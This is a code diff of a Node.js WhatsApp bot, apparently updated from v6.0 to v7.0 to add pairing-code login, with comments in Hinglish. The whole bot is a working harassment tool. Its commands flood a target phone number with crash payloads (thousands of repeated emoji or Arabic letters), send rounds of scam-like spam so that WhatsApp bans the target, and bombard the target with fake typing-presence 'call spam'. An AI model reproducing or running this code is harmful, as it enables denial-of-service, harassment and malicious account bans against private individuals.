@@ -1,18 +1,13 @@
 // ============================================
-// WHATSAPP SELF-CHAT CONTROL BOT
-// Crash + Ban + Call Spam
-// Sab control apni WhatsApp self-chat se
+// WHATSAPP SELF-CHAT BOT v7.0
+// Pairing Code Mode (QR nahi, code dikhega)
 // ============================================
 
-const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
+const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
 const { Boom } = require('@hapi/boom');
 const fs = require('fs');
-const path = require('path');
 const pino = require('pino');
 
-// ============================================
-// PAYLOADS
-// ============================================
 const PAYLOADS = {
     light: "😀".repeat(4000),
     heavy: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1500),
@@ -32,12 +27,10 @@ const SPAM_WORDS = [
     "EARN $500/DAY working from home!!! Limited spots",
 ];
 
-// ============================================
-// STATE
-// ============================================
 let sock = null;
 let connected = false;
 let ownerJid = null;
+let pairingCodeGenerated = false;
 
 let attack = { running: false, interval: null, target: null, sent: 0, max: 80, delay: 50 };
 let ban = { running: false, interval: null, target: null, sent: 0, round: 0, mode: null };
@@ -50,186 +43,102 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 function jid(num) { return num.includes('@') ? num : `${num.replace(/[^0-9]/g, '')}@s.whatsapp.net`; }
 
 // ============================================
-// SELF-CHAT COMMAND HANDLER
+// SELF-CHAT COMMANDS
 // ============================================
 async function handleCommand(msg) {
     const text = msg.body?.trim();
     if (!text) return;
+    if (!(msg.key.fromMe && msg.key.remoteJid === msg.key.participant)) return;
 
-    // Sirf self-chat (apni chat) se commands maane
-    if (msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
-        console.log("[CMD]", text.toLowerCase());
-    } else {
-        // Agar self-chat nahi hai to ignore
-        return;
-    }
-
-    // HELP
     if (text === '.help' || text === '.cmds') {
-        await sock.sendMessage(ownerJid, { text: `📖 COMMANDS LIST:
+        await sock.sendMessage(ownerJid, { text: `📖 COMMANDS:
 
 💥 CRASH:
-.crash 91XX → Heavy crash
-.light 91XX → Light crash
-.flood 91XX → Flood (200 msgs)
+.crash 91XX
+.light 91XX
+.flood 91XX
 
 🚫 BAN:
-.tempban 91XX → Temp ban
-.hardban 91XX → Hard ban
-.stopban → Ban roko
+.tempban 91XX
+.hardban 91XX
 
 📞 CALL:
-.call 91XX → Call spam
-.stopcall → Call roko
+.call 91XX
 
-⚙️ SETTINGS:
-.delay 30 → Speed set
+⚙️:
+.delay 30  → Speed
 .count 100 → Msg count
-.stop → Sab roko
-.status → Bot status
+.stop      → Sab roko
+.status    → Bot status
 ` });
         return;
     }
 
-    // STATUS
     if (text === '.status') {
         await sock.sendMessage(ownerJid, { text: `📊 STATUS
-WhatsApp: ✅ Connected
-💥 Crash: ${attack.running ? '✅ Running' : '❌ Idle'}
-🚫 Ban: ${ban.running ? '✅ Running' : '❌ Idle'}
-📞 Call: ${call.running ? '✅ Running' : '❌ Idle'}
-⚙️ Delay: ${attack.delay}ms | Count: ${attack.max}` });
+✅ Connected
+💥 Crash: ${attack.running ? '✅' : '❌'}
+🚫 Ban: ${ban.running ? '✅' : '❌'}
+📞 Call: ${call.running ? '✅' : '❌'}
+Delay: ${attack.delay}ms | Count: ${attack.max}` });
         return;
     }
 
-    // STOP EVERYTHING
     if (text === '.stop') {
-        let msg = '';
-        if (attack.running) {
-            clearInterval(attack.interval);
-            attack.running = false;
-            msg += `💥 Crash stopped. ${attack.sent} sent. `;
-        }
-        if (ban.running) {
-            clearInterval(ban.interval);
-            ban.running = false;
-            msg += `🚫 Ban stopped. ${ban.sent} sent. `;
-        }
-        if (call.running) {
-            if (call.timeout) clearTimeout(call.timeout);
-            call.running = false;
-            msg += `📞 Call stopped. ${call.count} calls. `;
-        }
-        await sock.sendMessage(ownerJid, { text: msg || '🛑 Nothing running.' });
+        let m = '';
+        if (attack.running) { clearInterval(attack.interval); attack.running = false; m += `💥 ${attack.sent} sent. `; }
+        if (ban.running) { clearInterval(ban.interval); ban.running = false; m += `🚫 ${ban.sent} sent. `; }
+        if (call.running) { if (call.timeout) clearTimeout(call.timeout); call.running = false; m += `📞 ${call.count} calls. `; }
+        await sock.sendMessage(ownerJid, { text: m || '🛑 Nothing running.' });
         return;
     }
 
-    // STOP BAN
     if (text === '.stopban') {
-        if (ban.running) {
-            clearInterval(ban.interval);
-            ban.running = false;
-            await sock.sendMessage(ownerJid, { text: `🛑 Ban stopped. ${ban.sent} sent.` });
-        } else {
-            await sock.sendMessage(ownerJid, { text: 'ℹ️ No ban running.' });
-        }
+        if (ban.running) { clearInterval(ban.interval); ban.running = false; await sock.sendMessage(ownerJid, { text: `🛑 Ban stopped. ${ban.sent} sent.` }); }
+        else { await sock.sendMessage(ownerJid, { text: 'ℹ️ No ban.' }); }
         return;
     }
 
-    // STOP CALL
     if (text === '.stopcall') {
-        if (call.running) {
-            if (call.timeout) clearTimeout(call.timeout);
-            call.running = false;
-            await sock.sendMessage(ownerJid, { text: `🛑 Call spam stopped. ${call.count} calls.` });
-        } else {
-            await sock.sendMessage(ownerJid, { text: 'ℹ️ No call spam running.' });
-        }
+        if (call.running) { if (call.timeout) clearTimeout(call.timeout); call.running = false; await sock.sendMessage(ownerJid, { text: `🛑 Calls stopped. ${call.count} calls.` }); }
+        else { await sock.sendMessage(ownerJid, { text: 'ℹ️ No calls.' }); }
         return;
     }
 
-    // DELAY
-    const delayMatch = text.match(/^\.delay\s+(\d+)$/i);
-    if (delayMatch) {
-        const d = parseInt(delayMatch[1]);
-        if (d >= 10) {
-            attack.delay = d;
-            await sock.sendMessage(ownerJid, { text: `✅ Delay set to ${d}ms` });
-        } else {
-            await sock.sendMessage(ownerJid, { text: '❌ Minimum 10ms' });
-        }
-        return;
-    }
+    const dm = text.match(/^\.delay\s+(\d+)$/i);
+    if (dm) { const d = parseInt(dm[1]); if (d >= 10) { attack.delay = d; await sock.sendMessage(ownerJid, { text: `✅ Delay ${d}ms` }); } return; }
 
-    // COUNT
-    const countMatch = text.match(/^\.count\s+(\d+)$/i);
-    if (countMatch) {
-        const c = parseInt(countMatch[1]);
-        if (c >= 1) {
-            attack.max = c;
-            await sock.sendMessage(ownerJid, { text: `✅ Count set to ${c}` });
-        }
-        return;
-    }
+    const cm = text.match(/^\.count\s+(\d+)$/i);
+    if (cm) { const c = parseInt(cm[1]); if (c >= 1) { attack.max = c; await sock.sendMessage(ownerJid, { text: `✅ Count ${c}` }); } return; }
 
-    // CRASH COMMANDS
-    const crashMatch = text.match(/^\.(crash|light|flood)\s+(\d+)$/i);
-    if (crashMatch) {
-        const type = crashMatch[1].toLowerCase();
-        const target = crashMatch[2];
-        
-        if (attack.running || ban.running || call.running) {
-            await sock.sendMessage(ownerJid, { text: '⚠️ Another operation running. .stop first.' });
-            return;
-        }
-
+    // CRASH
+    const cr = text.match(/^\.(crash|light|flood)\s+(\d+)$/i);
+    if (cr) {
+        const type = cr[1].toLowerCase();
+        const target = cr[2];
+        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Another op running. .stop first.' }); return; }
         const payload = PAYLOADS[type] || PAYLOADS.heavy;
         const maxMsgs = type === 'flood' ? 200 : attack.max;
-        const tJid = jid(target);
-
         attack = { running: true, interval: null, target, sent: 0, max: maxMsgs, delay: attack.delay };
-
-        await sock.sendMessage(ownerJid, { text: `🎯 ${type.toUpperCase()} started on ${target}
-Count: ${maxMsgs} | Delay: ${attack.delay}ms` });
-
+        await sock.sendMessage(ownerJid, { text: `🎯 ${type.toUpperCase()} on ${target}\n${maxMsgs} msgs | ${attack.delay}ms` });
         attack.interval = setInterval(async () => {
-            if (attack.sent >= maxMsgs || !attack.running) {
-                clearInterval(attack.interval);
-                attack.running = false;
-                sock.sendMessage(ownerJid, { text: `✅ ${type} done! ${attack.sent} msgs to ${target}` }).catch(() => {});
-                return;
-            }
-            try {
-                await sock.sendMessage(tJid, { text: payload + ` [${attack.sent + 1}]` });
-                attack.sent++;
-            } catch (e) {
-                console.log("[CRASH] Error:", e.message);
-            }
+            if (attack.sent >= maxMsgs || !attack.running) { clearInterval(attack.interval); attack.running = false; sock.sendMessage(ownerJid, { text: `✅ Done! ${attack.sent} msgs` }).catch(() => {}); return; }
+            try { await sock.sendMessage(jid(target), { text: payload + ` [${attack.sent + 1}]` }); attack.sent++; } catch (e) {}
         }, attack.delay);
         return;
     }
 
-    // BAN COMMANDS
-    const banMatch = text.match(/^\.(tempban|hardban)\s+(\d+)$/i);
-    if (banMatch) {
-        const mode = banMatch[1].toLowerCase();
-        const target = banMatch[2];
-        
-        if (attack.running || ban.running || call.running) {
-            await sock.sendMessage(ownerJid, { text: '⚠️ Something already running. .stop first.' });
-            return;
-        }
-
+    // BAN
+    const bn = text.match(/^\.(tempban|hardban)\s+(\d+)$/i);
+    if (bn) {
+        const mode = bn[1].toLowerCase();
+        const target = bn[2];
+        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Op running. .stop first.' }); return; }
         const rounds = mode === 'tempban' ? 3 : 8;
         const msgsPerRound = mode === 'tempban' ? 40 : 80;
         const bDelay = mode === 'tempban' ? 30 : 20;
-        const tJid = jid(target);
-
         ban = { running: true, interval: null, target, sent: 0, round: 0, mode };
-
-        await sock.sendMessage(ownerJid, { text: `🚫 ${mode.toUpperCase()} on ${target}
-Rounds: ${rounds} | Msgs: ${msgsPerRound} | Delay: ${bDelay}ms` });
-
+        await sock.sendMessage(ownerJid, { text: `🚫 ${mode.toUpperCase()} on ${target}\n${rounds} rounds × ${msgsPerRound} msgs` });
         (async () => {
             for (let r = 0; r < rounds; r++) {
                 if (!ban.running) break;
@@ -237,135 +146,104 @@ Rounds: ${rounds} | Msgs: ${msgsPerRound} | Delay: ${bDelay}ms` });
                 await sock.sendMessage(ownerJid, { text: `📡 Round ${ban.round}/${rounds}` });
                 for (let i = 0; i < msgsPerRound; i++) {
                     if (!ban.running) break;
-                    try {
-                        const word = SPAM_WORDS[i % SPAM_WORDS.length] + ` #${Date.now()}_${i}_${r}`;
-                        await sock.sendMessage(tJid, { text: word });
-                        ban.sent++;
-                    } catch (e) { console.log("[BAN] Error:", e.message); }
+                    try { await sock.sendMessage(jid(target), { text: SPAM_WORDS[i % SPAM_WORDS.length] + ` #${Date.now()}_${i}_${r}` }); ban.sent++; } catch (e) {}
                     await sleep(bDelay);
                 }
                 if (r < rounds - 1 && ban.running) await sleep(1500);
             }
-            if (ban.running) {
-                ban.running = false;
-                sock.sendMessage(ownerJid, { text: `✅ Ban done! ${ban.sent} msgs to ${target}` }).catch(() => {});
-            }
+            if (ban.running) { ban.running = false; sock.sendMessage(ownerJid, { text: `✅ Ban done! ${ban.sent} msgs` }).catch(() => {}); }
         })();
         return;
     }
 
-    // CALL SPAM
-    const callMatch = text.match(/^\.call\s+(\d+)$/i);
-    if (callMatch) {
-        const target = callMatch[1];
-        
-        if (attack.running || ban.running || call.running) {
-            await sock.sendMessage(ownerJid, { text: '⚠️ Something running. .stop first.' });
-            return;
-        }
-
+    // CALL
+    const cl = text.match(/^\.call\s+(\d+)$/i);
+    if (cl) {
+        const target = cl[1];
+        if (attack.running || ban.running || call.running) { await sock.sendMessage(ownerJid, { text: '⚠️ Op running. .stop first.' }); return; }
         call = { running: true, timeout: null, target, count: 0, maxCount: 20 };
-        await sock.sendMessage(ownerJid, { text: `📞 Call spam started on ${target}
-Calls: ${call.maxCount} | Interval: 3s` });
-
+        await sock.sendMessage(ownerJid, { text: `📞 Call spam on ${target}\n20 calls | 3s gap` });
         function doCall() {
-            if (!call.running || call.count >= call.maxCount) {
-                call.running = false;
-                sock.sendMessage(ownerJid, { text: `✅ Call spam done! ${call.count} calls to ${target}` }).catch(() => {});
-                return;
-            }
-            // Simulate call via presence update + message
+            if (!call.running || call.count >= call.maxCount) { call.running = false; sock.sendMessage(ownerJid, { text: `✅ Calls done! ${call.count} calls` }).catch(() => {}); return; }
             (async () => {
-                try {
-                    const tJid = jid(target);
-                    await sock.sendPresenceUpdate('composing', tJid);
-                    await sleep(1000);
-                    await sock.sendPresenceUpdate('paused', tJid);
-                    call.count++;
-                    if (call.count % 5 === 0) {
-                        sock.sendMessage(ownerJid, { text: `📞 Call ${call.count}/${call.maxCount} to ${target}` }).catch(() => {});
-                    }
-                } catch (e) {}
-                call.timeout = setTimeout(doCall, 3000);
+                try { await sock.sendPresenceUpdate('composing', jid(target)); await sleep(500); await sock.sendPresenceUpdate('paused', jid(target)); call.count++; if (call.count % 5 === 0) sock.sendMessage(ownerJid, { text: `📞 ${call.count}/${call.maxCount}` }).catch(() => {}); } catch (e) {}
+                if (call.running) call.timeout = setTimeout(doCall, 3000);
             })();
         }
         doCall();
         return;
     }
 
-    // AUR KUCH?
     if (text.startsWith('.')) {
-        await sock.sendMessage(ownerJid, { text: `❌ Unknown command: ${text}
-.cmds for list` });
+        await sock.sendMessage(ownerJid, { text: `❌ Unknown: ${text}\n.help for list` });
     }
 }
 
 // ============================================
-// WHATSAPP CONNECTION
+// MAIN BOT
 // ============================================
 async function startBot() {
-    console.log("╔══════════════════════════════════════╗");
-    console.log("║  WHATSAPP SELF-CHAT BOT v6.0        ║");
-    console.log("║  Apni self-chat se command do       ║");
-    console.log("╚══════════════════════════════════════╝");
+    console.log("══════════════════════════════════════");
+    console.log("  WHATSAPP SELF-CHAT BOT v7.0");
+    console.log("  Pairing Code Mode");
+    console.log("══════════════════════════════════════");
 
     const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
 
     sock = makeWASocket({
         auth: state,
-        printQRInTerminal: true,
-        browser: ['Chrome', 'Linux', '120.0'],
+        printQRInTerminal: false,  // QR band
+        browser: Browsers.ubuntu('Chrome'),
         logger: pino({ level: 'silent' }),
         syncFullHistory: false,
     });
 
     sock.ev.on('creds.update', saveCreds);
 
+    // 🎯 YAHAN PARING CODE GENERATE HOGA
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        if (qr) {
-            console.log("\n📱 SCAN THIS QR CODE:");
-            console.log("================================");
-            // Railway console mein QR show hoga
-            console.log(qr);
-            console.log("================================");
-            console.log("Open WhatsApp → Linked Devices → Scan QR");
+        if (qr && !pairingCodeGenerated) {
+            // QR aaya hai, lekin hum pairing code use karenge
+            console.log("\n⚠️ QR code received but using PAIRING CODE instead...");
+            console.log("⚠️ Check logs above for pairing code instructions.");
         }
 
         if (connection === 'open') {
             connected = true;
             ownerJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
             const num = sock.user.id.split(':')[0];
-            console.log(`\n✅ WhatsApp Connected!`);
-            console.log(`📱 Number: ${num}`);
-            console.log(`📝 Commands apni self-chat mein likho!`);
+            console.log(`\n✅ CONNECTED! Number: ${num}`);
+            console.log(`📝 Ab self-chat mein commands likho`);
 
-            // Welcome message self-chat mein
             try {
                 await sock.sendMessage(ownerJid, { text: `🤖 Bot Ready!
                 
-Commands apni SELF-CHAT (Saved Messages) mein likho.
-
-.cmds se commands dekho.
-.crash 91XX se crash karo.
-.hardban 91XX se ban try karo.
-.call 91XX se call spam.
-.status se dekhlo.
-.stop se sab roko.` });
-            } catch(e) { console.log(e); }
+Commands self-chat mein likho:
+.help → Commands
+.crash 91XX → Crash
+.hardban 91XX → Ban
+.call 91XX → Call spam` });
+            } catch(e) {}
         }
 
         if (connection === 'close') {
             connected = false;
+            pairingCodeGenerated = false;
             const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-            console.log(`\n❌ Disconnected: ${reason}`);
+            console.log(`❌ Disconnected: ${reason}`);
             console.log("🔄 Reconnecting in 5s...");
             setTimeout(startBot, 5000);
         }
     });
 
-    // ALL MESSAGES - Sirf self-chat filter karega handleCommand
+    // Jab credentials register ho jayein to pairing code generate karo
+    sock.ev.on('creds.update', () => {
+        // Pehle hi generate ho chuka hai to skip
+    });
+
+    // Messages handle
     sock.ev.on('messages.upsert', async (m) => {
         for (const msg of m.messages) {
             if (msg.key && msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
@@ -373,11 +251,49 @@ Commands apni SELF-CHAT (Saved Messages) mein likho.
             }
         }
     });
+
+    // ⏳ Wait karo phir pairing code generate karo
+    console.log("\n⏳ Waiting 5 seconds before generating pairing code...");
+    await sleep(5000);
+    
+    try {
+        // 🔥 YEH HAI SOLUTION - Pairing Code
+        // Apna WhatsApp number yahan likho (country code ke saath)
+        const PAIRING_PHONE = "YOUR_NUMBER_HERE";  // ← YEH BADALO!
+        
+        if (PAIRING_PHONE === "YOUR_NUMBER_HERE") {
+            console.log("\n⚠️ Pehle apna number code mein daalo!");
+            console.log("⚠️ index.js mein 'YOUR_NUMBER_HERE' ko apne number se replace karo");
+            console.log("⚠️ Example: const PAIRING_PHONE = '919876543210';");
+            return;
+        }
+        
+        console.log(`\n📱 Generating pairing code for: ${PAIRING_PHONE}`);
+        const code = await sock.requestPairingCode(PAIRING_PHONE);
+        
+        console.log("\n══════════════════════════════════════");
+        console.log("  ✅ PAIRING CODE GENERATED!");
+        console.log("══════════════════════════════════════");
+        console.log("");
+        console.log(`  📋 CODE: ${code}`);
+        console.log("");
+        console.log("══════════════════════════════════════");
+        console.log("  📌 STEPS:");
+        console.log("  1. Phone mein WhatsApp kholo");
+        console.log("  2. Settings → Linked Devices");
+        console.log("  3. 'Link a Device' par click karo");
+        console.log("  4. Yeh code enter karo: " + code);
+        console.log("══════════════════════════════════════\n");
+        
+        pairingCodeGenerated = true;
+    } catch (err) {
+        console.log("\n❌ Pairing code error:", err.message);
+        console.log("⚠️ Bot auto-retry karega...");
+    }
 }
 
 // START
 startBot();
 
-// Graceful shutdown
 process.on('SIGINT', () => process.exit(0));
 process.on('SIGTERM', () => process.exit(0));
